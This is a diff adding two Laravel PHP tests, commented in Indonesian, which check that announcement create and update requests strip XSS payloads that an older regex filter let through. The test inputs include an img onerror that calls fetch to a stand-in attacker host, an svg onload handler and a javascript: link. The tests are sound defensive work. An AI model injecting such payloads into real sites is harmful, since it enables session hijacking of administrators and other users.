@@ -63,6 +63,49 @@ class AnnouncementAdminTest extends TestCase
         $this->assertStringNotContainsString('<script>', Announcement::where('title', 'XSS')->first()->body);
     }
 
+    /**
+     * Penyaring lama hanya regex penghapus pasangan <script>/<style>. Isi
+     * pengumuman dirender mentah di dashboard SEMUA user, jadi muatan yang
+     * melewati regex itu berarti pengambilalihan sesi superadmin.
+     *
+     * @test
+     */
+    public function store_menetralkan_muatan_xss_yang_melewati_penyaring_lama(): void
+    {
+        $this->actingAs($this->user('superadmin'))->post(route('announcement.store'), [
+            'title'  => 'XSS lanjut',
+            'body'   => '<img src=x onerror="fetch(\'//penyerang\')">'
+                      . '<svg onload="alert(1)"></svg>'
+                      . '<a href="javascript:alert(2)">klik</a>',
+            'status' => 'draft',
+        ])->assertRedirect();
+
+        $body = Announcement::where('title', 'XSS lanjut')->first()->body;
+
+        $this->assertStringNotContainsString('onerror', $body);
+        $this->assertStringNotContainsString('onload', $body);
+        $this->assertStringNotContainsString('javascript:', $body);
+        $this->assertStringNotContainsString('penyerang', $body);
+        $this->assertStringContainsString('klik', $body, 'Teks yang sah harus tetap ada.');
+    }
+
+    /** @test */
+    public function update_juga_menetralkan_muatan_xss(): void
+    {
+        $a = Announcement::create([
+            'title' => 'Awal', 'body' => '<p>bersih</p>', 'status' => 'draft',
+            'created_by' => $this->user('superadmin')->id,
+        ]);
+
+        $this->actingAs($this->user('superadmin'))->put(route('announcement.update', $a->id), [
+            'title'  => 'Awal',
+            'body'   => '<img src=x onerror="alert(1)">',
+            'status' => 'draft',
+        ])->assertRedirect();
+
+        $this->assertStringNotContainsString('onerror', $a->fresh()->body);
+    }
+
     /** @test */
     public function non_admin_roles_cannot_access(): void
     {
